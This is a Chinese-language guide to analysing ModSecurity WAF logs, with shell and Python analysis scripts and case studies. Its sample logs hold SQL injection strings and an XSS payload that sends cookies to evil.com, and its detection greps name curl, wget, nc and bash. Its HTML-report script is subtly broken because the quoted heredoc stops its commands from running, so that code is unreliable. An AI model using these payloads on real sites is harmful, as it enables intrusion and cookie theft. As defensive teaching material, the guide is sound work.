# WAF拦截日志分析指南

> **版本**: 1.0.0  
> **日期**: 2026-02-15  
> **目标**: ModSecurity日志分析与威胁情报

---

## 目录

1. [日志类型](#日志类型)
2. [日志格式解析](#日志格式解析)
3. [日志分析工具](#日志分析工具)
4. [攻击模式识别](#攻击模式识别)
5. [实战案例分析](#实战案例分析)
6. [自动化分析](#自动化分析)
7. [可视化展示](#可视化展示)

---

## 日志类型

### 1. 访问日志（Access Log）

**路径**: `logs/nginx/access.log`

**用途**: 记录所有HTTP请求

**示例**:
```
192.168.1.100 - - [15/Feb/2026:10:30:45 +0800] "GET /api/v1/users HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
```

### 2. 错误日志（Error Log）

**路径**: `logs/nginx/error.log`

**用途**: 记录Nginx和WAF错误

**示例**:
```
2026/02/15 10:30:45 [error] 1234#1234: *5678 ModSecurity: Access denied with code 403 (phase 2). 
Pattern match "(?i)union.*select" at ARGS:id. [file "/etc/nginx/modsecurity/custom-rules.conf"] 
[line "10"] [id "10001"] [msg "SQL Injection - UNION SELECT"] [severity "CRITICAL"] 
[tag "attack-sqli"] [hostname "pms.example.com"] [uri "/api/v1/users"] [unique_id "1234567890"]
```

### 3. WAF拦截日志（Blocked Log）

**路径**: `logs/nginx/blocked.log`

**用途**: 专门记录被WAF拦截的请求

**示例**:
```
192.168.1.100 - - [15/Feb/2026:10:30:45 +0800] "GET /api/v1/users?id=1' UNION SELECT * FROM users-- HTTP/1.1" 403 162 "-" "sqlmap/1.5" WAF_BLOCK
```

### 4. ModSecurity审计日志（Audit Log）

**路径**: `logs/nginx/modsec_audit.log`

**用途**: 详细的安全事件记录

**格式**: 分为多个Section（A-Z）

---

## 日志格式解析

### ModSecurity审计日志结构

#### Section A - 审计日志头

```
--a1b2c3d4-A--
[15/Feb/2026:10:30:45 +0800] 1234567890 192.168.1.100 12345 pms.example.com 443
--a1b2c3d4-B--
```

**字段说明**:
- `1234567890` - 唯一事务ID
- `192.168.1.100` - 客户端IP
- `12345` - 客户端端口
- `pms.example.com` - 服务器主机名
- `443` - 服务器端口

#### Section B - 请求头

```
GET /api/v1/users?id=1' UNION SELECT * FROM users-- HTTP/1.1
Host: pms.example.com
User-Agent: sqlmap/1.5
Accept: */*
Connection: close
```

#### Section C - 请求体

```
--a1b2c3d4-C--
username=admin&password=test123
```

#### Section F - 响应头

```
--a1b2c3d4-F--
HTTP/1.1 403 Forbidden
Server: nginx
Date: Wed, 15 Feb 2026 02:30:45 GMT
Content-Type: text/html
Content-Length: 162
```

#### Section H - 审计日志追踪

```
--a1b2c3d4-H--
ModSecurity: Warning. Pattern match "(?i)union.*select" at ARGS:id. 
[file "/etc/nginx/modsecurity/custom-rules.conf"] 
[line "10"] 
[id "10001"] 
[msg "SQL Injection - UNION SELECT"] 
[data "Matched Data: union select found within ARGS:id: 1' UNION SELECT * FROM users--"] 
[severity "CRITICAL"] 
[ver "OWASP_CRS/3.3.0"] 
[tag "application-multi"] 
[tag "language-multi"] 
[tag "platform-multi"] 
[tag "attack-sqli"]
```

**关键字段**:
- `[id "10001"]` - 规则ID
- `[msg "..."]` - 拦截原因
- `[severity "CRITICAL"]` - 严重性级别
- `[tag "attack-sqli"]` - 攻击类型标签
- `[data "..."]` - 匹配的数据

#### Section Z - 审计日志尾

```
--a1b2c3d4-Z--
```

---

## 日志分析工具

### 1. 命令行工具

#### grep - 快速搜索

```bash
# 搜索SQL注入攻击
grep "attack-sqli" logs/nginx/modsec_audit.log

# 搜索特定IP的拦截记录
grep "192.168.1.100" logs/nginx/blocked.log

# 搜索最近1小时的拦截
grep "$(date -d '1 hour ago' '+%d/%b/%Y:%H')" logs/nginx/blocked.log
```

#### awk - 数据提取和统计

```bash
# 统计各IP的拦截次数
awk '{print $1}' logs/nginx/blocked.log | sort | uniq -c | sort -rn

# 统计各攻击类型数量
grep -oP '(?<=\[tag ")[^"]+' logs/nginx/modsec_audit.log | \
    grep "attack-" | sort | uniq -c | sort -rn

# 提取所有被拦截的URL
grep "ModSecurity: Access denied" logs/nginx/error.log | \
    grep -oP '(?<=uri ")[^"]+' | sort | uniq -c | sort -rn
```

#### sed - 日志清洗

```bash
# 提取审计日志中的Section H
sed -n '/^--.*-H--$/,/^--.*-Z--$/p' logs/nginx/modsec_audit.log

# 提取规则ID
sed -n 's/.*\[id "\([^"]*\)"\].*/\1/p' logs/nginx/modsec_audit.log | sort | uniq -c
```

### 2. 分析脚本

#### 统计脚本

**创建**: `scripts/waf/analyze-logs.sh`

```bash
#!/bin/bash
# WAF日志分析脚本

LOG_FILE="${1:-logs/nginx/modsec_audit.log}"
TIME_RANGE="${2:-1h}"

echo "======================================"
echo "WAF日志分析报告"
echo "时间范围: $TIME_RANGE"
echo "======================================"
echo ""

# 1. 拦截总数
echo "[总体统计]"
total_blocks=$(grep -c "ModSecurity: Access denied" "$LOG_FILE")
echo "总拦截次数: $total_blocks"
echo ""

# 2. 攻击类型分布
echo "[攻击类型分布]"
grep -oP '(?<=\[tag ")[^"]+' "$LOG_FILE" | \
    grep "attack-" | \
    sort | uniq -c | sort -rn | \
    head -10 | \
    awk '{printf "  %-20s %5d\n", $2, $1}'
echo ""

# 3. TOP攻击IP
echo "[TOP 10 攻击IP]"
grep -oP '^\S+' logs/nginx/blocked.log | \
    sort | uniq -c | sort -rn | \
    head -10 | \
    awk '{printf "  %-15s %5d次\n", $2, $1}'
echo ""

# 4. TOP触发规则
echo "[TOP 10 触发规则]"
grep -oP '(?<=\[id ")[^"]+' "$LOG_FILE" | \
    sort | uniq -c | sort -rn | \
    head -10 | \
    awk '{printf "  Rule ID %-10s %5d次\n", $2, $1}'
echo ""

# 5. 严重性分布
echo "[严重性分布]"
grep -oP '(?<=\[severity ")[^"]+' "$LOG_FILE" | \
    sort | uniq -c | sort -rn | \
    awk '{printf "  %-15s %5d\n", $2, $1}'
echo ""
```

**使用**:
```bash
chmod +x scripts/waf/analyze-logs.sh
bash scripts/waf/analyze-logs.sh logs/nginx/modsec_audit.log
```

#### JSON转换脚本

```python
#!/usr/bin/env python3
# scripts/waf/modsec-log-to-json.py

import re
import json
import sys

def parse_audit_log(log_file):
    """解析ModSecurity审计日志为JSON"""
    events = []
    current_event = {}
    
    with open(log_file, 'r') as f:
        content = f.read()
    
    # 分割各个事件
    sections = re.split(r'--\w+-A--', content)[1:]
    
    for section in sections:
        event = {}
        
        # 提取基本信息
        header_match = re.search(r'\[(.*?)\] (\w+) ([\d.]+) (\d+) (.*?) (\d+)', section)
        if header_match:
            event['timestamp'] = header_match.group(1)
            event['transaction_id'] = header_match.group(2)
            event['client_ip'] = header_match.group(3)
            event['client_port'] = header_match.group(4)
            event['hostname'] = header_match.group(5)
            event['port'] = header_match.group(6)
        
        # 提取请求信息
        request_match = re.search(r'--\w+-B--\n(.*?)\n', section)
        if request_match:
            event['request'] = request_match.group(1)
        
        # 提取规则信息
        rules = []
        for match in re.finditer(r'\[id "(.*?)"\].*?\[msg "(.*?)"\].*?\[severity "(.*?)"\]', section):
            rules.append({
                'id': match.group(1),
                'message': match.group(2),
                'severity': match.group(3)
            })
        event['rules'] = rules
        
        # 提取标签
        tags = re.findall(r'\[tag "([^"]+)"\]', section)
        event['tags'] = list(set([t for t in tags if t.startswith('attack-')]))
        
        events.append(event)
    
    return events

if __name__ == '__main__':
    log_file = sys.argv[1] if len(sys.argv) > 1 else 'logs/nginx/modsec_audit.log'
    events = parse_audit_log(log_file)
    print(json.dumps(events, indent=2, ensure_ascii=False))
```

**使用**:
```bash
python3 scripts/waf/modsec-log-to-json.py > waf-events.json
```

---

## 攻击模式识别

### 1. SQL注入识别

#### 特征模式

```bash
# 查找UNION SELECT攻击
grep -i "union.*select" logs/nginx/blocked.log

# 查找OR绕过攻击
grep -i "or.*1.*=.*1" logs/nginx/blocked.log

# 查找注释符号
grep -E "(--|#|/\*)" logs/nginx/blocked.log
```

#### 案例分析

**日志示例**:
```
192.168.1.100 - - [15/Feb/2026:10:30:45 +0800] 
"GET /api/v1/users?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 
403 162 "-" "sqlmap/1.5"
```

**分析**:
- ✅ 攻击类型: SQL注入 (UNION SELECT)
- ✅ 攻击工具: sqlmap
- ✅ 攻击目标: 用户表
- ✅ WAF状态: 已拦截 (403)

### 2. XSS攻击识别

#### 特征模式

```bash
# Script标签注入
grep -i "<script" logs/nginx/blocked.log

# 事件处理器注入
grep -iE "(onerror|onload|onclick)" logs/nginx/blocked.log

# JavaScript协议
grep -i "javascript:" logs/nginx/blocked.log
```

#### 案例分析

**日志示例**:
```
192.168.1.50 - - [15/Feb/2026:11:15:30 +0800] 
"GET /api/v1/search?q=<script>document.location='http://evil.com/'+document.cookie</script> HTTP/1.1" 
403 162 "-" "Mozilla/5.0"
```

**分析**:
- ✅ 攻击类型: XSS (Cookie窃取)
- ✅ 攻击意图: 窃取用户Cookie
- ✅ WAF状态: 已拦截

### 3. 路径穿越识别

```bash
# 查找../模式
grep -E "\.\./|\.\.\\" logs/nginx/blocked.log

# 查找编码变体
grep -i "%2e%2e" logs/nginx/blocked.log
```

### 4. 命令注入识别

```bash
# 查找Shell命令
grep -iE "(cat|ls|wget|curl|nc|bash)" logs/nginx/blocked.log

# 查找命令分隔符
grep -E "[;|&\`]" logs/nginx/blocked.log
```

### 5. 扫描行为识别

#### 特征

- **高频请求**: 短时间大量请求
- **404错误多**: 尝试发现隐藏路径
- **特殊User-Agent**: sqlmap, nikto, nmap等

#### 检测脚本

```bash
# 检测扫描行为
#!/bin/bash

# 统计每个IP的404数量
awk '$9 == 404 {print $1}' logs/nginx/access.log | \
    sort | uniq -c | sort -rn | \
    awk '$1 > 20 {print $2, $1 "次404"}' | \
    head -10

echo "疑似扫描IP："
awk '$9 == 404 {print $1}' logs/nginx/access.log | \
    sort | uniq -c | sort -rn | \
    awk '$1 > 50 {print "  " $2 " - " $1 "次404，疑似扫描"}'
```

---

## 实战案例分析

### 案例1: SQL注入攻击

#### 原始日志

```
--a1b2c3d4-A--
[15/Feb/2026:10:30:45 +0800] 1234567890 192.168.1.100 12345 pms.example.com 443
--a1b2c3d4-B--
GET /api/v1/users?id=1' OR '1'='1 HTTP/1.1
Host: pms.example.com
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
--a1b2c3d4-H--
ModSecurity: Warning. Pattern match "(?i)or\\s+['\"]?1['\"]?\\s*=\\s*['\"]?1" at ARGS:id. 
[file "/etc/nginx/modsecurity/custom-rules.conf"] [line "25"] [id "10003"] 
[msg "SQL Injection - OR Bypass"] [severity "CRITICAL"] [tag "attack-sqli"]
--a1b2c3d4-Z--
```

#### 分析结果

| 项目 | 内容 |
|------|------|
| 攻击者IP | 192.168.1.100 |
| 攻击时间 | 2026-02-15 10:30:45 |
| 攻击方法 | SQL注入 (OR绕过) |
| 目标接口 | /api/v1/users |
| 触发规则 | ID 10003 |
| 防护结果 | ✅ 已拦截 |

#### 后续动作

1. **IP封禁**: 将192.168.1.100加入黑名单
2. **安全加固**: 检查/api/v1/users接口参数验证
3. **告警通知**: 发送安全告警给运维团队

### 案例2: 暴力破解攻击

#### 日志模式

```bash
# 查看某IP的登录失败记录
grep "192.168.1.200" logs/nginx/access.log | \
    grep "/api/v1/auth/login" | \
    grep "401"

# 输出:
192.168.1.200 - - [15/Feb/2026:14:00:01 +0800] "POST /api/v1/auth/login" 401
192.168.1.200 - - [15/Feb/2026:14:00:03 +0800] "POST /api/v1/auth/login" 401
192.168.1.200 - - [15/Feb/2026:14:00:05 +0800] "POST /api/v1/auth/login" 401
... (共50次)
192.168.1.200 - - [15/Feb/2026:14:02:30 +0800] "POST /api/v1/auth/login" 403 ← 速率限制触发
```

#### 分析

- 🚨 **攻击类型**: 暴力破解
- 🚨 **尝试次数**: 50+次
- ✅ **防护措施**: 速率限制触发，返回403
- ⚡ **建议动作**: IP临时封禁

### 案例3: 扫描器识别

#### 日志

```
45.76.123.45 - - [15/Feb/2026:16:20:10 +0800] 
"GET /admin/login.php HTTP/1.1" 404 162 "-" "nikto/2.1.6"

45.76.123.45 - - [15/Feb/2026:16:20:11 +0800] 
"GET /.env HTTP/1.1" 404 162 "-" "nikto/2.1.6"

45.76.123.45 - - [15/Feb/2026:16:20:12 +0800] 
"GET /phpMyAdmin/ HTTP/1.1" 404 162 "-" "nikto/2.1.6"
```

#### 特征

- ✅ User-Agent包含"nikto"
- ✅ 大量404错误
- ✅ 请求不存在的路径

#### WAF拦截

```
45.76.123.45 - - [15/Feb/2026:16:20:13 +0800] 
"GET /test.php HTTP/1.1" 403 162 "-" "nikto/2.1.6" WAF_BLOCK
```

**规则ID 12010触发**: 恶意扫描器检测

---

## 自动化分析

### 1. 实时监控脚本

**创建**: `scripts/waf/realtime-analyzer.sh`

```bash
#!/bin/bash
# 实时WAF日志分析

BLOCKED_LOG="logs/nginx/blocked.log"
THRESHOLD=10  # 1分钟内拦截超过10次则告警

# 实时tail日志
tail -f "$BLOCKED_LOG" | while read line; do
    # 提取IP
    ip=$(echo "$line" | awk '{print $1}')
    
    # 统计最近1分钟该IP的拦截次数
    count=$(grep "$ip" "$BLOCKED_LOG" | \
            grep "$(date -d '1 minute ago' '+%d/%b/%Y:%H:%M')" | \
            wc -l)
    
    if [ "$count" -gt "$THRESHOLD" ]; then
        echo "[ALERT] IP $ip 被拦截 $count 次（最近1分钟）"
        
        # 发送告警（示例：企业微信）
        # curl -X POST "$WEBHOOK_URL" -d "{...}"
        
        # 自动封禁（可选）
        # iptables -A INPUT -s $ip -j DROP
    fi
done
```

### 2. 定时统计报告

**创建**: `scripts/waf/daily-report.sh`

```bash
#!/bin/bash
# 每日WAF报告

REPORT_FILE="logs/waf/daily-report-$(date +%Y%m%d).txt"
mkdir -p logs/waf

{
    echo "======================================"
    echo "WAF每日安全报告"
    echo "日期: $(date '+%Y-%m-%d')"
    echo "======================================"
    echo ""
    
    # 1. 总体统计
    echo "[总体统计]"
    total_requests=$(wc -l < logs/nginx/access.log)
    total_blocks=$(wc -l < logs/nginx/blocked.log)
    block_rate=$(echo "scale=2; $total_blocks * 100 / $total_requests" | bc)
    echo "总请求数: $total_requests"
    echo "拦截数: $total_blocks"
    echo "拦截率: $block_rate%"
    echo ""
    
    # 2. TOP攻击IP
    echo "[TOP 10 攻击IP]"
    awk '{print $1}' logs/nginx/blocked.log | \
        sort | uniq -c | sort -rn | head -10
    echo ""
    
    # 3. 攻击类型分布
    echo "[攻击类型分布]"
    grep -oP '(?<=\[tag ")[^"]+' logs/nginx/modsec_audit.log | \
        grep "attack-" | sort | uniq -c | sort -rn
    echo ""
    
    # 4. 建议措施
    echo "[建议措施]"
    echo "1. 重点关注IP："
    awk '{print $1}' logs/nginx/blocked.log | \
        sort | uniq -c | sort -rn | head -3 | \
        awk '{print "   - " $2 " (拦截" $1 "次)"}'
    echo ""
    
} > "$REPORT_FILE"

# 发送报告（邮件/企业微信等）
echo "报告已生成: $REPORT_FILE"
```

**设置定时任务**:
```bash
# crontab -e
0 0 * * * /path/to/scripts/waf/daily-report.sh
```

---

## 可视化展示

### 1. Grafana仪表盘（推荐）

#### 数据源配置

```bash
# 安装Promtail（日志收集）
# 安装Loki（日志存储）
# 配置Grafana数据源

# Promtail配置示例
cat > /etc/promtail/config.yml <<'EOF'
server:
  http_listen_port: 9080

positions:
  filename: /tmp/positions.yaml

clients:
  - url: http://loki:3100/loki/api/v1/push

scrape_configs:
  - job_name: waf
    static_configs:
      - targets:
          - localhost
        labels:
          job: waf
          __path__: /var/log/nginx/*.log
EOF
```

#### Grafana查询示例

```
# 拦截次数时序图
sum(rate({job="waf"} |= "403" [1m])) by (source_ip)

# 攻击类型分布
topk(10, count_over_time({job="waf"} |~ "attack-" [1h]))

# TOP攻击IP
topk(10, count_over_time({job="waf"} |= "403" [1h]) by (source_ip))
```

### 2. 简易HTML报表

**生成脚本**: `scripts/waf/generate-report-html.sh`

```bash
#!/bin/bash
# 生成HTML报表

OUTPUT="logs/waf/report-$(date +%Y%m%d-%H%M%S).html"

cat > "$OUTPUT" <<'EOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WAF安全报告</title>
    <style>
        body { font-family: Arial; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; }
        h1 { color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { padding: 10px; text-align: left; border: 1px solid #ddd; }
        th { background: #007bff; color: white; }
        tr:nth-child(even) { background: #f9f9f9; }
        .stat-box { display: inline-block; margin: 10px; padding: 20px; background: #e7f3ff; border-radius: 5px; }
        .critical { color: #dc3545; font-weight: bold; }
        .warning { color: #ffc107; }
        .safe { color: #28a745; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ WAF安全报告</h1>
        <p>生成时间: $(date)</p>
        
        <h2>📊 总体统计</h2>
        <div class="stat-box">
            <h3>总请求数</h3>
            <p>$(wc -l < logs/nginx/access.log)</p>
        </div>
        <div class="stat-box">
            <h3 class="critical">拦截次数</h3>
            <p>$(wc -l < logs/nginx/blocked.log)</p>
        </div>
        
        <h2>🔴 TOP攻击IP</h2>
        <table>
            <tr><th>IP地址</th><th>拦截次数</th></tr>
$(awk '{print $1}' logs/nginx/blocked.log | sort | uniq -c | sort -rn | head -10 | \
  awk '{print "            <tr><td>" $2 "</td><td class=\"critical\">" $1 "</td></tr>"}')
        </table>
        
        <h2>⚡ 攻击类型分布</h2>
        <table>
            <tr><th>攻击类型</th><th>次数</th></tr>
$(grep -oP '(?<=\[tag ")[^"]+' logs/nginx/modsec_audit.log | grep "attack-" | sort | uniq -c | sort -rn | \
  awk '{print "            <tr><td>" $2 "</td><td class=\"warning\">" $1 "</td></tr>"}')
        </table>
    </div>
</body>
</html>
EOF

echo "HTML报告已生成: $OUTPUT"
```

---

## 最佳实践

### 1. 日志保留策略

```bash
# 日志轮转配置 /etc/logrotate.d/nginx-waf
/path/to/logs/nginx/*.log {
    daily                    # 每天轮转
    missingok               # 文件不存在不报错
    rotate 30               # 保留30天
    compress                # 压缩旧日志
    delaycompress          # 延迟压缩
    notifempty             # 空文件不轮转
    create 0640 nginx nginx # 创建新文件权限
    sharedscripts
    postrotate
        docker-compose exec nginx-waf nginx -s reopen
    endscript
}
```

### 2. 敏感信息脱敏

```bash
# 脱敏处理脚本
sed 's/password=[^&]*/password=****/g' logs/nginx/access.log > logs/nginx/access-clean.log
```

### 3. 异常检测阈值

| 指标 | 正常范围 | 告警阈值 | 紧急阈值 |
|------|----------|----------|----------|
| 拦截率 | < 1% | > 5% | > 10% |
| 单IP拦截次数/分钟 | < 5 | > 10 | > 20 |
| 404错误率 | < 5% | > 20% | > 50% |
| 登录失败次数/IP | < 3 | > 5 | > 10 |

### 4. 定期审查清单

**每周**:
- [ ] 查看TOP攻击IP
- [ ] 分析攻击类型趋势
- [ ] 检查误报情况
- [ ] 更新黑名单

**每月**:
- [ ] 生成月度报告
- [ ] 评估规则有效性
- [ ] 优化规则配置
- [ ] 安全趋势分析

---

**文档版本**: v1.0.0  
**最后更新**: 2026-02-15  
**维护者**: PMS Security Team
